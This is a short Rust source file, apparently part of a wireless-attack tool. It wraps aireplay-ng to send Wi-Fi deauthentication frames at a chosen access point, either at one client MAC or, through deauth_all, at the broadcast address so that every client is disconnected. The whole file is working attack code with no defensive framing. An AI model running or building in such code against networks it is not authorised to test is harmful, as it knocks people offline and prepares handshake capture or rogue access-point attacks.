use std::process::Command;
use crate::system_control;

pub fn deauth_client(iface: &str, bssid: &str, client_mac: &str, count: u32) -> Result<String, String> {
    // Ensure interface is in monitor mode for aireplay-ng
    // Note: this might disrupt hostapd if running on the same interface directly
    let effective_iface = system_control::ensure_monitor_mode(iface).unwrap_or(iface.to_string());

    // usa aireplay-ng se disponibile
    let output = Command::new("aireplay-ng")
        .args(["--deauth", &count.to_string(), "-a", bssid, "-c", client_mac, &effective_iface])
        .output()
        .map_err(|e| format!("aireplay-ng not found or execution failed: {}", e))?;

    if !output.status.success() {
        let err_msg = String::from_utf8_lossy(&output.stderr);
        if err_msg.contains("is on channel") {
             return Err(format!("Channel mismatch or interface not in monitor mode: {}", err_msg));
        }
        return Err(format!("aireplay-ng failed: {}", err_msg));
    }

    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

pub fn deauth_all(iface: &str, bssid: &str) -> Result<String, String> {
    deauth_client(iface, bssid, "FF:FF:FF:FF:FF:FF", 10)
}
